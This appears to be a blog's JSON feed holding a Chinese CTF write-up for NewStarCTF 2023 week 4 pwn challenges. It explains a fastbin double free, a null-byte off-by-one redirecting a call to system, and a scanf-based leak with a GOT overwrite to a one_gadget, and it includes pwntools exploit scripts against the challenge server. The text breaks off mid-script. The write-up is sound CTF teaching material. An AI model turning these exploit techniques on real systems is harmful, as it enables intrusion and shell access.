{
    "version": "https://jsonfeed.org/version/1",
    "title": "Walt's Blog • All posts by \"heap\" tag",
    "description": "",
    "home_page_url": "http://waltcsz.github.io",
    "items": [
        {
            "id": "http://waltcsz.github.io/PWN/Write-Up/newstarctf2023-week4-9e6c658aa51b/",
            "url": "http://waltcsz.github.io/PWN/Write-Up/newstarctf2023-week4-9e6c658aa51b/",
            "title": "newstarctf2023 week4",
            "date_published": "2023-10-19T17:20:21.000Z",
            "content_html": "<h1 id=\"newstartctf2023_week4-pwn\"><a class=\"markdownIt-Anchor\" href=\"#newstartctf2023_week4-pwn\">#</a> newstartctf2023_week4 pwn</h1>\n<h2 id=\"double\"><a class=\"markdownIt-Anchor\" href=\"#double\">#</a> Double</h2>\n<p>堆 heap, double_free, fastbin</p>\n<p>libc: 2.23</p>\n<p>程序中功能选择只有创建 <code>add()</code> ，删除 <code>del()</code>  和检查 <code>check()</code> 。其中， <code>check()</code>  内存在后门函数，只要 0x602070 处的值为 1638，即可直接 getsshell。</p>\n<p>其次， <code>del()</code>  中释放块后没有清除指针，可以进行 double free。因此只要在 0x602070 处伪造块，并设置值为 1638。</p>\n<p><code>add()</code>  中固定分配 0x28 大小的块，并且同时写入内容。释放后进入 fastbin。</p>\n<blockquote>\n<p>实际占用 0x30 空间，释放后进入 fastbin [1]</p>\n</blockquote>\n<h3 id=\"步骤\"><a class=\"markdownIt-Anchor\" href=\"#步骤\">#</a> 步骤</h3>\n<p>分配 2 个 chunk，序号分别为 0、1，然后按 0、1、0 的顺序释放 chunk，这样 0 号 chunk 在 fastbin 中存在 2 次构成闭环。</p>\n<pre><code>fastbin[1] -&gt; chunk0 -&gt; chunk1 -&gt; chunk0 (-&gt;chunk1)\n</code></pre>\n<p>再次分配一个块，此时分配到 0 号 chunk，在其中输入 0x602070 的编码。此时 fastbin [1] 中即为：</p>\n<pre><code>fastbin[1] -&gt; chunk1 —&gt; chunk0 -&gt; 0x602070\n</code></pre>\n<p>再分配 3 次，在第 3 次时输入内容 1638，然后选择进入 <code>check()</code> 。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25043</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./Double_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x400B3C')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x602070</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">1638</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input idx\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input content\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input idx\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>target<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"game\"><a class=\"markdownIt-Anchor\" href=\"#game\">#</a> game</h2>\n<p>NULL_byte_off-by-one in stack, libc 偏移</p>\n<p>或许这道题属于 re？而且这道题含 utf-8 字符，写脚本还不好写。</p>\n<h3 id=\"程序流程\"><a class=\"markdownIt-Anchor\" href=\"#程序流程\">#</a> 程序流程</h3>\n<p>程序大致流程如下：</p>\n<ul>\n<li>先选择角色，选择三月七或派蒙。</li>\n<li>然后进入主循环。主循环中，可以选择送原石（接委托）或者送 kfc 联名套餐（对肯德基爷爷说话）。其中，原神玩家只能接委托，崩铁玩家只能对肯德基爷爷说话，否则都会直接退出。</li>\n<li>接委托中，会让 v7 增加 0x10000（起始为 0）。其次，如果 v7 大于 0x3ffff，即执行了 4 次以上委托，就会泄露 system 函数的地址。</li>\n<li>对话中，使用 read 函数向栈上输入值。这里存在漏洞，如果没有输入回车作为结尾，会自动在字符串最后添加 <code>'\\0'</code> ，在输入 8 个非回车字节后直接覆盖第 9 字节，可以修改相邻的变量。而该变量标识了玩家选择的角色，1 为三月七，0 为派蒙。覆盖为 0 后，可以从对话转为接委托。</li>\n</ul>\n<p><img data-src=\"./image-20231019173000077.png\" alt=\"image-20231019173000077\"></p>\n<h3 id=\"漏洞\"><a class=\"markdownIt-Anchor\" href=\"#漏洞\">#</a> 漏洞</h3>\n<p>在主函数最后，会执行 <code>&amp;puts-v3-v7</code>  处的函数，以 v5 作为变量。因此调整对应函数地址为 system 的地址，让 v5 指向 <code>&quot;/bin/sh\\0&quot;</code> ，即可实现 getshell。</p>\n<p>其中，进入该分支的前提是，主菜单选择时输入 3，并且执行过接委托和对话。而利用 read 函数处的漏洞即可实现。v7 的值即执行委托时累加的值，v3 的值当场输入，但只能输入 short 类型，即只能输入范围在 - 32768~32767 的值。</p>\n<p><img data-src=\"./image-20231019173843622.png\" alt=\"image-20231019173843622\"></p>\n<h4 id=\"计算偏移\"><a class=\"markdownIt-Anchor\" href=\"#计算偏移\">#</a> 计算偏移</h4>\n<p>首先计算 puts 函数和 system 函数的偏移。这个利用题目所给的 libc.so.6 文件即可直接算出，不需要先泄露再去计算，因为这边只需要偏移不需要绝对地址。所以接委托中泄露 system 地址的功能可有可无。利用 pwintools 算一算。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_a <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"puts: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>puts_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, system: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sys_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#bs_a = libcbase + next(libc.search(b'/bin/sh'))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>offset <span class=\"token operator\">=</span> puts_a <span class=\"token operator\">-</span> sys_a</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"offset: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>offset<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v3 <span class=\"token operator\">=</span> offset <span class=\"token operator\">-</span> i<span class=\"token operator\">*</span><span class=\"token number\">0x10000</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: v3=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>v3<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231019174341968.png\" alt=\"image-20231019174341968\"></p>\n<p>两者偏移为 205200，只有在 v7 为 0x30000 时，v3 才能控制在 short 范围内，即 8592。</p>\n<p>v5 的值即为与肯德基老爷爷对话的内容，所以对话时输入 <code>&quot;/bin//sh&quot;</code> ，刚好 8 字节。</p>\n<blockquote>\n<p>懒得写脚本实现了，不然我更喜欢 /bin/sh\\0</p>\n</blockquote>\n<p><img data-src=\"./image-20231019174720038.png\" alt=\"image-20231019174720038\"></p>\n<h2 id=\"message-board\"><a class=\"markdownIt-Anchor\" href=\"#message-board\">#</a> message board</h2>\n<p>scanf 漏洞，got 劫持</p>\n<p>主函数中，存在任意地址写入，但首先会经过 board 函数。</p>\n<p>在 board 函数中，可以自定义选择往栈上利用 scanf 输入最多 15 个字节。接着，会要求输入 puts 的真实地址，输入错误直接结束程序。</p>\n<h3 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h3>\n<p>scanf 函数可以利用非数字字符跳过输入，而这样的操作不会改变对应地址原本的值。但是如果输入大部分非数字字符，scanf 读取后跳过，但不会将该字符从缓冲区中拿走，因此，该程序后续的所有 scanf 都会直接跳过，包括要求输入 puts 地址的。但是，如果输入的是 <code>'+'</code> ，那么只会忽略当前的 <code>&quot;%d&quot;</code> ，应该是因为 + 作为正负号吧。</p>\n<p>跳过大量 scanf，我们可以拿到很多栈上数据。</p>\n<p><img data-src=\"./image-20231019180236594.png\" alt=\"image-20231019180236594\" style=\"zoom:50%;\" /><img data-src=\"./image-20231019180408010.png\" alt=\"image-20231019180408010\"></p>\n<p>其中，可以通过黄色的地址推算栈上地址。可以通过紫色地址推算 libc 基址。</p>\n<p>利用 <code>_IO_2_1_stdeer_</code> 推算 libc 基地址，然后查库算出 puts 真实地址并输入，即可进入主函数。</p>\n<p>在主函数中，由于没有对下标进行检测，所以我们拥有两次修改任意地址 4 字节的机会。但由于输入均为输入 32 位整数，且 a 数组处于.bss 段，所以够不到 libc 处或者栈空间，但是可以够到 got 表，且只开了 Partial RELRO 保护，got 可写。<img data-src=\"./image-20231019181238330.png\" alt=\"image-20231019181238330\" style=\"zoom:67%;\" /></p>\n<p>在主函数最后执行了 <code>exit(0)</code> ，因此我们可以将 got 表中 exit 的值修改为 one_gadget，便可以直接执行 getshell。</p>\n<h3 id=\"计算下标\"><a class=\"markdownIt-Anchor\" href=\"#计算下标\">#</a> 计算下标</h3>\n<p>a 数组的地址为 0x4040A0，而 got 表 exit 项的地址为 0x404030，因此偏移为 <code>offset=0x404030-0x4040A0=-0x70</code> ，下标应为 <code>idx=offset/4=-0x70/0x4=-0x1c=-28</code> 。而 one_gadget 长度超过 4 字节，应分两次写入，刚好用完两次机会。第一次往 <code>idx=-28</code>  处写入地址低 4 位字节 <code>onegadget&amp;0xffffffff</code> ，第二次往 <code>idx+1=-27</code>  处写入高 4 位字节 <code>onegadget&gt;&gt;32</code> 。</p>\n<h3 id=\"one_gadget获取\"><a class=\"markdownIt-Anchor\" href=\"#one_gadget获取\">#</a> one_gadget 获取</h3>\n<p>利用 one_gadget 工具。获取了该 libc 版本的 3 个 one_gadget。</p>\n<p><img data-src=\"./image-20231019182348766.png\" alt=\"image-20231019182348766\"></p>\n<p>在程序运行到最后 exit 时，rdi 和 rsi 寄存器值为 0，可以使用第三个 one_gadget。</p>\n<p><img data-src=\"./image-20231019182306437.png\" alt=\"image-20231019182306437\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28040</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x401336')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset </pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#p.send(payload)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'15'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>strerr <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>stack1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'+'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'is '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        strerr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">12</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        stack1 <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"strerr:%#x, stack:%#x\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>strerr<span class=\"token punctuation\">,</span>stack1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>libcbase <span class=\"token operator\">=</span> strerr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#if offine, libcbase need add 0x30</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>puts_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#rtld = libcbase + libc.sym['_rtld_global']</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rtld <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x222030</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>one_gadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>exit_hook <span class=\"token operator\">=</span> rtld <span class=\"token operator\">+</span> <span class=\"token number\">3848</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>exit_g <span class=\"token operator\">=</span> <span class=\"token number\">0x404030</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">0x4040A0</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>exit_g<span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Now please enter the verification code\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>puts_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'You can modify your suggestions\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rtld-libc %#x\"</span><span class=\"token operator\">%</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_rtld_global'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libcbase %#x\"</span><span class=\"token operator\">%</span>libcbase<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"rtld: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>rtld<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, exithook: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>exit_hook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, sys_a: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sys_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>exit_hook<span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">assert</span> index <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x7fffffff</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input new suggestion\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>one_gadget<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token 